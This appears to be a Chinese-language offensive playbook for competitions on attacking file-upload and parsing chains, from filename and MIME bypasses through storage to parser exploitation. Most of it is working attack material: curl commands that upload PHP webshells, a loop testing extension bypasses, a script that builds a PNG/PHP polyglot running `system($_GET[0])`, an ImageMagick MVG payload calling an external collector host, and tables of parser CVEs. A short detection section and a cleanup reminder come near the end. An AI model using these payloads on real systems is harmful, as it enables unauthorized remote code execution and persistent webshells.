# 文件解析链：上传→解析→执行的每一环

> 被 `competition-file-parser-chain` 引用。链条上有五个关口，**只有全部通过**文件才会被
> 真正解析。多数失败是因为在错误的关口上努力。

## 一、五环链条

```
[1] 传输层      multipart 格式、filename、Content-Type
[2] 前置校验    扩展名黑/白名单、大小限制、数量限制
[3] 内容校验    MIME 嗅探（magic bytes）、图像重编码、AV 扫描
[4] 落盘        文件名（重命名？路径拼接？）、存储位置（web 可达？）
[5] 解析/执行   解析器读取（图片库/办公文档/PDF/归档）、或 web 服务器执行
```

**每一环都要单独确认**：这一环是否存在、判定依据是什么、能否绕过。

```bash
# 标准上传
curl -s -X POST https://target/upload \
  -F 'file=@shell.php;type=image/png' \
  -H 'Authorization: Bearer '$TOKEN
```

## 二、第 1 环：multipart 与 filename

| 手法 | 载荷 | 目标 |
| --- | --- | --- |
| 双扩展名 | `shell.php.jpg` | 黑名单只查最后一段 |
| 空字节 | `shell.php%00.jpg`（旧 PHP） | 截断 |
| 大小写 | `shell.PhP` / `shell.pHp5` | 大小写敏感的黑名单 |
| 特殊扩展 | `.phtml` `.php3` `.php4` `.php5` `.pht` `.phar` | 黑名单不全 |
| 尾点/空格 | `shell.php.` / `shell.php `（Windows） | 系统会去掉尾点/空格 |
| NTFS 流 | `shell.php::$DATA` | Windows ADS |
| 路径穿越 | `../../var/www/html/shell.php` | 文件名拼路径 |
| 超长文件名 | 200+ 字符 | 截断到 `.php` |
| 分号 | `shell.asp;.jpg`（IIS） | IIS 6 解析分号前 |
| 编码 | `shell%2ephp` | 解码差异 |

```bash
# 批量测扩展名绕过（关键：看响应里的存储路径/文件名）
for n in shell.php shell.php.jpg shell.php%00.jpg shell.PhP shell.phtml shell.php. shell.php::$DATA shell.php5 shell.phar; do
  printf '%-24s ' "$n"
  curl -s -X POST https://target/upload \
    -F "file=@payload.png;filename=$n;type=image/png" \
    -H 'Authorization: Bearer '$TOKEN | head -c 120; echo
done
```

**Content-Type 单独绕**（很多实现只查它）：

```bash
# 声称是图片，实际是 PHP
curl -s -X POST https://target/upload \
  -F 'file=@shell.php;type=image/png;filename=x.png'
# 若落盘时用 Content-Type 决定扩展名 → 可能存成 .png（安全）
# 若用 filename → 存成 shell.php（危险）
```

## 三、第 2 环：扩展名校验的四种实现

| 实现 | 缺陷 | 绕过 |
| --- | --- | --- |
| **黑名单** | 永远不全 | 找未列出的可执行扩展（见上表） |
| **白名单（只查 filename）** | 可用双扩展/尾点 | `x.jpg.php`（取决于取哪段） |
| **白名单（用 `pathinfo` 取最后一段）** | 尾点导致取到空 | `x.php.` 在 Windows 上被当 `.php` |
| **白名单（用 MIME）** | MIME 可伪造 | `type=image/png` 配任意内容 |

```bash
# 判断用的是哪个：上传一个 .jpg 但内容是 PHP
curl -s -X POST https://target/upload -F 'file=@php_as_jpg.jpg;type=image/jpeg'
# 若成功且后续能访问执行 → 只查了扩展名，没有内容校验
```

## 四、第 3 环：内容校验（最难过的一环）

### 4.1 MIME 嗅探

```bash
# 看它真的读了内容吗：传一个 PNG 头 + PHP 尾
python3 - <<'PY'
open('poly.png','wb').write(
    b'\x89PNG\r\n\x1a\n' + b'\x00'*100 + b'<?php system($_GET[0]); ?>')
PY
curl -s -X POST https://target/upload -F 'file=@poly.png;type=image/png'
```

若服务端用 `finfo`/`magic bytes` 判断 → PNG 头能过。落盘后是否可执行取决于扩展名与存储路径。

### 4.2 图像重编码（最强的防护）

若服务端把上传的图片**重新编码**（`imagecreatefrompng` → `imagepng`），则：
- 所有附加的 PHP 代码被丢弃
- 元数据被清除
- 文件是真实图片

**这种情况下的绕法只有**：找重编码后仍保留数据的位置（EXIF 保留？ICC profile？），或
利用解析器本身的漏洞（ImageMagick 的 CVE、ImageTragick）。

```bash
# 判断是否重编码：传一个带 EXIF 的图，下载回来对比
exiftool original.jpg | head -20
curl -s -X POST https://target/upload -F 'file=@original.jpg' -F 'type=image/jpeg' | tee up.json
NEWURL=$(jq -r .url up.json)
curl -s "$NEWURL" -o downloaded.jpg
exiftool downloaded.jpg | head -20
# EXIF 全没了 & 文件大小变了 → 重编码了
```

### 4.3 解析器漏洞（内容校验也会被穿透）

| 解析器 | 已知问题类型 | 探测 |
| --- | --- | --- |
| **ImageMagick** | ImageTragick（MVG/SVG）、`delegate` 命令注入 | 上传 `.mvg`/`.svg` 含 `url(https://...)` 或 `fill 'url(...)'` |
| **GraphicsMagick** | 同上 | — |
| **libpng/libjpeg** | 解析崩溃（DoS），少见 RCE | 畸形文件 |
| **Ghostscript**（PDF 转图） | `-dSAFER` 绕过史 | PDF 里嵌 PostScript |
| **Apache POI**（Office） | XXE、OOM、反序列化 | `.docx` 里放外部实体 |
| **PDFium/pdf.js** | JS 执行、字体漏洞 | PDF 含 JavaScript |
| **FFmpeg**（音视频） | SSRF（HLS/concat）、解码漏洞 | `.m3u8` 指向内部地址 |
| **ExifTool** | DjVu 命令注入（CVE-2021-22204） | 特制 DjVu |
| **7-Zip / unrar** | 路径穿越、CVE | 见 `zip-archive` |

```bash
# ImageMagick 的 SSRF/命令注入探测（授权范围内，指向自己的 collector）
cat > evil.mvg <<'EOF'
push graphic-context
viewbox 0 0 640 480
fill 'url(https://COLLECTOR.example.com/x.png)'
pop graphic-context
EOF
curl -s -X POST https://target/upload -F 'file=@evil.mvg;type=image/png'
# collector 收到请求 → 确认 SSRF（delegate 被执行）
```

### 4.4 判断解析器版本

```bash
# 上传后看错误信息（最直接）
curl -s -X POST https://target/upload -F 'file=@corrupt.jpg' | head -c 500
# "ImageMagick 6.9.11-60" / "PDFium" / "POI 5.2.2" 等常出现在错误里
```

```bash
# 从响应头/图片元数据推断
curl -s https://target/uploads/xxx.jpg -o out.jpg
exiftool out.jpg | grep -iE 'software|creator|producer'
```

## 五、第 4 环：落盘位置与可执行性

这是"上传漏洞"变成"RCE"的关键。

```bash
# 上传后从响应里拿路径
curl -s -X POST https://target/upload -F 'file=@x.png' | jq .
# {"url":"/uploads/2024/01/abc123.png","name":"x.png"}
```

| 落盘行为 | 判断 | 后果 |
| --- | --- | --- |
| 原样保留文件名 | 响应里 name 与上传一致 | 可预测路径 |
| 重命名为随机 | 响应里是 uuid/hash | 路径不可预测，但 URL 会返回 |
| 按日期分目录 | `/uploads/2024/01/` | 可预测 |
| 存到 web 根下 | URL 可直接访问 | **可执行（若扩展名允许）** |
| 存到非 web 目录 | 需要通过下载接口取 | 不可直接执行 |
| 存到对象存储 | URL 是 S3/OSS 域 | 不可执行（除非配了静态网站托管 + 错误 MIME） |

```bash
# 判断存储位置是否可执行：上传一个 .php（若被允许），直接访问看是否执行
curl -s https://target/uploads/abc123.php?0=id
# 返回命令输出 → 可执行
# 返回源码 → 可读但不可执行（信息泄露）
# 404 → 路径错或不在 web 根
```

**IIS/Apache/nginx 的解析差异**（决定哪些扩展会执行）：

| 服务器 | 会执行 | 陷阱 |
| --- | --- | --- |
| Apache + mod_php | `.php` `.php5` `.phtml`（看配置） | `.php.jpg` **不执行**（除非 `AddHandler` 配错） |
| Apache 多后缀 | `AddHandler application/x-httpd-php .php` 时 `x.php.jpg` **会执行** | 经典配置错误 |
| nginx + php-fpm | 由 `location ~ \.php$` 决定 | `x.php/1.jpg` 可执行（`cgi.fix_pathinfo=1`） |
| IIS 6 | `.asp;.jpg` | 分号截断 |
| IIS 7+ | `.asp/` 路径信息 | 需 `ExtensionlessUrlHandler` 配置 |

```bash
# 测 nginx 的 pathinfo 解析
curl -s 'https://target/uploads/x.jpg/1.php'   # 若执行 → fix_pathinfo
curl -s 'https://target/uploads/x.php.jpg'     # 若执行 → 多后缀 handler
```

## 六、第 5 环：解析器真的处理了文件吗

这是验伤的关键：**文件被存下来了 ≠ 被解析了**。

```bash
# 图片：解析会生成缩略图（尺寸变化证明解析）
curl -s https://target/uploads/abc.png -o a.png
identify a.png            # 原始尺寸
# 若服务端有缩略图接口，对比
curl -s 'https://target/thumb?src=/uploads/abc.png' -o b.png
identify b.png            # 尺寸变化 → 解析了

# PDF：解析会提取文本/渲染首页
curl -s 'https://target/preview?id=abc' -o p.png
file p.png               # 是图片 → 渲染了

# 文档：解析会提取缩略图/元数据
curl -s https://target/api/files/abc/meta | jq .
```

**判据**：解析器的输出（缩略图、文本、页数、EXIF）存在，才能证明它读了文件。

## 七、验伤：文件解析链的成功标准

| 结论 | 证据 | 假象 |
| --- | --- | --- |
| 上传绕过扩展名校验 | 落盘文件名是 `.php` + URL 可访问 + **执行了** | 上传 200 但实际存成 `.png` |
| 内容校验可绕 | 上传的多态文件**被解析器接受**（生成缩略图） | 上传成功但解析失败（服务端静默丢弃） |
| 解析器 SSRF | collector 收到来自**目标服务器**的请求（含其出口 IP） | 只是上传成功 |
| 解析器 RCE | 命令输出/回连 | 解析崩溃（只是 DoS） |
| zip slip | 文件被写到**预期目录之外** | 解压成功但在正确目录内 |
| 存储路径可执行 | `curl` 拿到的响应对文件里的代码产生副作用 | 返回源码（可读不可执行） |

**核心反例**：上传成功返回 200 只证明"文件收下了"。要证明"文件被执行/解析"，必须有
**解析器的副作用**（缩略图、命令输出、OOB 请求）。

## 八、检测视角

| 手法 | 日志/信号 | 特征 |
| --- | --- | --- |
| 扩展名绕过 | 上传服务日志 | 文件名含双扩展/尾点/空字节/NTFS 流 |
| 多态文件 | AV/沙箱 | magic bytes 与扩展名不匹配；文件内同时含图片头与脚本标签 |
| 图像重编码绕过 | — | 重编码后仍保留脚本（说明没重编码成功） |
| 解析器 SSRF | 出站流量 | 应用服务器向外部/内部地址发起请求（上传后立即触发） |
| 解析器 RCE | EDR | 图片处理进程（convert/gs/ffmpeg）拉起 shell |
| zip slip | 文件系统审计 | 解压目标目录外出现新文件 |
| webshell 落地 | web 服务器日志 | 新文件被 POST 请求访问，参数名异常（`?0=`/`?cmd=`） |

## 九、常见坑

1. **只测扩展名不测内容校验**——现代应用基本都有 MIME/重编码。先判断它读了内容没有。
2. **上传成功就宣称 RCE**——必须走完"落盘路径 + 可执行"两环。中间任何一环断都不算。
3. **忘了 URL 的路径可能被重写**——`/uploads/x.php` 可能被 nginx 的 `location` 拦成 404。换几个路径变体试。
4. **多态文件头太短**——有些嗅探器要求前 8-16 字节匹配；PNG 头是 `\x89PNG\r\n\x1a\n`（8 字节），够；GIF 是 `GIF89a`（6 字节）。
5. **图像重编码直接放弃**——转去测解析器漏洞（ImageMagick/ExifTool/FFmpeg），或找其他入口（文档上传、归档上传）。
6. **zip slip 的路径要算相对**——`../../x` 相对于解压目录。有些实现会 `resolve()` 后校验，那就换 `..\\`（Windows）或绝对路径。
7. **忘了看错误信息**——上传畸形文件时的错误常直接暴露解析器名称与版本，这是下一步的关键输入。
8. **测完没清理**——上传的 webshell/文件要删除，否则是留后门。